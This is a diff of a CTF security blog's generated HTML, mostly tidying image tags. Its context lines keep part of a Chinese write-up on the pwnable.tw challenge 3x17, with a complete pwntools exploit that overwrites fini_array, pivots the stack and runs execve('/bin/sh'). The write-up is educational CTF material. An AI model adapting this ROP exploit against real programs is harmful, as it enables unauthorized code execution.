@@ -204,7 +204,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
       <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
     </div>
@@ -342,7 +342,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+          <img src="/medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">ABf1ag&#39;s blog</a>
@@ -617,9 +617,9 @@
 
 
 <p><strong>可以通过找到hook的地址，然后写入shellcode，开启了NX保护的话，需要使用mprotect将段给予权限。</strong></p>
-<p><img src="/.io//image-20210714123009279.png" class="lazyload placeholder" data-srcset="/.io//image-20210714123009279.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210714123009279"></p>
+<p><img src="https://img.le1a.com/2023/02/07/b22b86c80dbfe.png" alt="image-20210714123009279"></p>
 <h3 id="例题：pwnable-tw-3x17"><a href="#例题：pwnable-tw-3x17" class="headerlink" title="例题：pwnable.tw 3x17"></a>例题：pwnable.tw 3x17</h3><p>经测试<code>sub_40ee70</code>函数是将你输入的值转为16进制地址。因此我们就可以进行任意地址读写操作。</p>
-<p><img src="/.io//image-20210922224507213.png" class="lazyload placeholder" data-srcset="/.io//image-20210922224507213.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210922224507213"></p>
+<p><img src="https://img.le1a.com/2023/02/07/e4162ece2fbf0.png" alt="image-20210922224507213"></p>
 <p>由于是静态pwn，也没有system函数和/bin/sh字符串，因此我们想到利用fini_array进行无限写的操作。只需要将fini_array[1]覆盖为main函数地址（<strong>如果直接跳转到main函数中间，那么就会因为有canary而报错。并且byte_4b9330他是unsigned int8,因此美循环0x100次就会变回1，今儿继续任意读写地址</strong>），将fini_array[0]覆盖为__libc_csu_fini函数的地址就可以进行无限写。接着我们只需要将rop写到fini_array[0]+0x10的位置上，然后再覆盖fini_array[0]为leave|ret,fini_array[1]覆盖为ret的地址就能将栈迁移到目标位置执行rop。</p>
 <p>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#适当添加sleep函数才能打通，当网络不太好的时候</span><br><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./3x17&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10105)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">pop_rdi=0x0000000000401696</span><br><span class="line">pop_rdx_rsi=0x000000000044a309</span><br><span class="line">pop_rax=0x000000000041e4af</span><br><span class="line">syscall=0x00000000004022b4</span><br><span class="line">leaver=0x0000000000401C4B</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931824&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(0x402960)+p64(0x401B6D))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931840&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(pop_rdi)+p64(0x4B4140)+p64(pop_rdx_rsi))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931864&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(0)+p64(0)+p64(pop_rax))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931888&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;data:&#x27;,p64(59)+p64(syscall)+&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.sendlineafter(&#x27;addr:&#x27;,&#x27;4931824&#x27;)</span><br><span class="line">#gdb.attach(io,&#x27;b *0x402960&#x27;)</span><br><span class="line">io.sendafter(&#x27;data:&#x27;,p64(leaver)+p64(leaver+1)+p64(pop_rdi))</span><br><span class="line">io.recv(0x14+0xa)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -659,7 +659,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/13.jpg" class="lazyload placeholder" data-srcset="/medias/13.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload" src="/medias/13.jpg" alt="">
     </div>
     <a href="/2021/08/02/cbctfpwn/" class="post-nav-link">
       <div class="title">
@@ -682,7 +682,7 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/6.jpg" class="lazyload placeholder" data-srcset="/medias/6.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload" src="/medias/6.jpg" src="" alt="">
     </div>
     <a href="/2021/06/13/qiang-wang-bei-2021pwn/" class="post-nav-link">
       <div class="title">
@@ -741,10 +741,10 @@ pwn的签到题，没做出来，裂开。。。
       </div>
       <div class="donate-box_img">
         <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+          <img src="/medias/1.jpg" alt="支付宝打赏" />
         </div> 
         <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+          <img src="/medias/2.jpg" alt="微信打赏" />
         </div>
       </div>
     </div>
@@ -955,7 +955,7 @@ pwn的签到题，没做出来，裂开。。。
             <div class="post-img-box">
               <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -976,7 +976,7 @@ pwn的签到题，没做出来，裂开。。。
             <div class="post-img-box">
               <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -997,7 +997,7 @@ pwn的签到题，没做出来，裂开。。。
             <div class="post-img-box">
               <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1018,7 +1018,7 @@ pwn的签到题，没做出来，裂开。。。
             <div class="post-img-box">
               <a href="/2022/12/30/nian-zhong-zong-jie-2022/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1039,7 +1039,7 @@ pwn的签到题，没做出来，裂开。。。
             <div class="post-img-box">
               <a href="/2022/01/19/yi-gou-pwn-xue-xi-ji-lu/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
